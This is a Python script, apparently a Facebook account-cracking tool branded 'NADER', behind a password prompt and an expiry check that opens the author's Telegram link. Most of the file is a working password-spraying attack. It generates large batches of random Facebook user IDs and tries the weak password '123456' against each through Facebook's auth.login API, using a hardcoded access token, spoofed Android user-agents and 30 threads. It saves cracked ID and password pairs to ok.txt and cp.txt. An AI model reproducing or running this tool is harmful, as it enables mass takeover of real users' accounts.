print("""
\033[1;32m------------------------------------------------------------
                            \033[1;31mN\033[1;32mA\033[1;33mD\033[1;34mE\033[1;35mR
\033[1;32m------------------------------------------------------------
         \033[1;32md8b   db  .d8b.  d8888b. d88888b d8888b.
         \033[1;31m888o  88 d8' `8b 88  `8D 88'     88  `8D
         \033[1;33m88V8o 88 88ooo88 88   88 88ooooo 88oobY'
         \033[1;34m88 V8o88 88~~~88 88   88 88~~~~~ 88`8b
         \033[1;35m88  V888 88   88 88  .8D 88.     88 `88.
         \033[1;36mVP   V8P YP   YP Y8888D' Y88888P 88   YD
\033[1;32m------------------------------------------------------------
                            \033[1;31mN\033[1;32mA\033[1;33mD\033[1;34mE\033[1;35mR
\033[1;32m------------------------------------------------------------
""")
print('\033[1;32m')
print('-----------------------------------------------------------')
print('                           \033[1;31mN\033[1;32mA\033[1;33mD\033[1;34mE\033[1;35mR\033[1;32m')
print('-----------------------------------------------------------')
print('-----------------------------------------------------------')
print('\033[1;35m ادخل كلمه السر')
print('\033[1;32m')
print('-----------------------------------------------------------')
print('                           \033[1;31mN\033[1;32mA\033[1;33mD\033[1;34mE\033[1;35mR\033[1;32m')
print('-----------------------------------------------------------')
name = input ('Entre password : \033[1;34m')
print('\033[1;32m')
print('\033[132m-----------------------------------------------------------')
if name == '2006' : 
	print('\033[1;35m كلمه السر صح')
	print ('اهلا وسهلا بك في اداتي')
else :
   print ('\033[1;31m كلمه السر غلط ')
   exit()

import webbrowser
import requests,time,pyfiglet,datetime
now = datetime.datetime.today()

now = datetime.datetime.today()
mm = str(now.month)
dd = str(now.day)
yyyy = str(now.year)
hour = str(now.hour)
mi = str(now.minute)
ss = str(now.second)
t=(mm + "/" + dd + "/" + yyyy + " " + hour + ":" + mi + ":" + ss)


hours = (now.hour)
x = datetime.datetime.now()
g= datetime.datetime(2023, 6, 7, 12, 10 ,9)


if (x.strftime("%x"))>(g.strftime("%x")):
 print('\033[1;32m تم ايقاف الاداه راسل المطور نادر لتفعيل ')
 time.sleep(1)
 print('\033[1;31m المطور نادر @N_2_N_1')
 time.sleep(1)
 print('\033[1;32m شروحات نادر')
 time.sleep(1)
 print('\033[1;31m 1')
 time.sleep(1)
 print('\033[1;32m 2')
 time.sleep(1)
 print('\033[1;31m 3')
 time.sleep(1)
 print('\033[1;32m 4')
 time.sleep(1)
 print('\033[1;31m 5')
 time.sleep(1)
 print('\033[1;32m 6')
 time.sleep(1)
 print('\033[1;31m 7')
 time.sleep(1)
 print('\033[1;32m 8')
 time.sleep(1)
 print('\033[1;31m 9')
 time.sleep(1)
 print('\033[1;32m10')
 webbrowser.open('https://t.me/@N_2_N_1')
 exit()
 open(".token.txt", "w").write(' . . . .')
 print(x)
import os, sys, re, time, requests, calendar, random, bs4, uuid, json, subprocess
from concurrent.futures import ThreadPoolExecutor
from requests.exceptions import ConnectionError

P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
Y = '\x1b[0m'    # WARNA MATI

class crack:
      
      def __init__(self):
            self.uid,self.loop,self.ok,self.cp=[],0,[],[]
            self.ses = requests.Session()
            self.old()
            
      def tahun(self,uidz):
            if len(uidz)==15:
                  if uidz[:10] in ['1000000000']:tahunz = '2009'
                  elif uidz[:9] in ['100000000']:tahunz = '2009'
                  elif uidz[:8] in ['10000000']:tahunz = '2009'
                  elif uidz[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:tahunz = '2009'
                  elif uidz[:7] in ['1000006','1000007','1000008','1000009']:tahunz = '2010'
                  else:tahunz=''
            elif len(uidz) in [9,10]:tahunz = '2008-2009'
            elif len(uidz)==8:tahunz = '2007-2008'
            elif len(uidz)==7:tahunz = '2006-2007'
            else:tahunz=''
            return tahunz
       
      def arachu(self):
            if "linux" in sys.platform.lower():
                  try:os.system('clear')
                  except KeyError:pass
                
      def old(self):
            
            self.arachu();jumlah = input('%s%s \033[1;31m _   _    _    ____  _____ ____\n\033[1;32m |\ | |  / \  |  _ \| ____|  _ \ \n\033[1;33m | \| | / _ \ | | | |  _| | |_) | \n\033[1;36m |  |\|/ ___ \| |_| | |___|  _ < \n\033[1;35m |_| \_/_/   \_\____/|_____|_| \_\ \n\033[1;32m10000\n\033[1;35m20000\n \033[1;31m30000\n\033[1;33m40000\n \033[1;34m50000\n\n\033[1;32m ادخل عدد الصيد : '%(H, P))
            try:
                  for i in range(int(jumlah)):
                        self.uid.append("100000"+str(random.randint(111111111,999999999)))
                      
                  print('\n%s%s \033[1;35m عدد الايديات : %s%s'%(H, P, H, len(self.uid)));self.listpas()
            except Exception as e:print(e)
            
      def listpas(self):
            print('%s%sNADER %sOk %s \033[1;36m @nade20080 %s\033[1;32mOk.txt\n%s%s\033[1;31mNADER %s\033[1;33mCp %s\033[1;33m المطور نادر  %sCp.txt%s\n'%(H, P, H, P, H, H, P, K, P, K, Y))
            with ThreadPoolExecutor(max_workers=30) as montox:
                  for xx in self.uid:
                        montox.submit(self.apih,xx,"123456".split(","))       
                        
      def apih(self, user, xxxxx):
            print('\r%s[ NADER ]  %s%s/%s  %s%s/%s%s%s'%(H, P,self.loop,len(self.uid),H,len(self.cp),K,len(self.ok),Y),end=" ");sys.stdout.flush()
            for pw in xxxxx:
                  try:
                        pw = pw.lower()
                        headers = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": self.uah(), "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
                        response = self.ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(user)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
                        
                        if "session_key" in response.text and "EAAA" in response.text:
                              print('\r%s[CP] %s • %s • %s%s'%(K,user, pw,self.tahun(user),Y))
                              self.ok.append(user)
                              with open('ok.txt','a') as x:
                                    x.write(user+'|'+pw+'\n')
                              break
                              
                        elif "www.facebook.com" in response.json()["error_msg"]:
                              print('\r%s[OK] %s • %s • %s%s'%(H,user, pw,self.tahun(user),Y))
                              self.cp.append(user)
                              with open('cp.txt','a') as x:
                                    x.write(user+'|'+pw+'\n')
                              break
                        else:continue
                        
                  except Exception as e:print(e)                  
            self.loop+=1
            
      def uah(self):
            rr = random.randint
            versi_android = f"{str(rr(3,9))}"+"."+f"{str(rr(0,2))}"+"."+f"{str(rr(0,2))}"
            fbav = f'{str(rr(40,400))}.0.0.'+f'{str(rr(1,10))}.'+f'{str(rr(10,400))}'
            fbbv = str(rr(100000000,800000000))
            merk = str(random.choice(["SM-A500F","SM-A500FU","SM-A500H","SM-G532F","SM-G900F","SM-G920F","SM-G930F","SM-G935","SM-G950F","SM-J320F","SM-J320FN","SM-J320H","SM-J320M","SM-J510FN","SM-J701F","SM-N920S","SM-T111","SM-T230","SM-T231","SM-T235","SM-T280","SM-T311","SM-T315","SM-T525","SM-T531","SM-T535","SM-T555","SM-T561","SM-T705","SM-T805","SM-T820"]))
            useragent = f'Dalvik/2.1.0 (Linux; U; Android {versi_android}; {merk} Build/PPR1.180610.011) [FBAN/MessengerLite;FBAV/{fbav};FBPN/com.facebook.mlite;FBLC/en_GB;FBBV/{fbbv};FBCR/AXIS;FBMF/samsung;FBBD/samsung;FBDV/{merk};FBSV/{versi_android};FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/'+'{density=3.0,height=750,width=1092};]'
            useragent1 = f"Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/"+"{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z007;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]"
            useragent3 = f"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
            useragent4 = f"Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16';]"
            useragent5 = f"Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.110 Mobile Safari/537.36"
            return str(random.choice([useragent5,useragent4,useragent3,useragent1,useragent]))
            
crack()
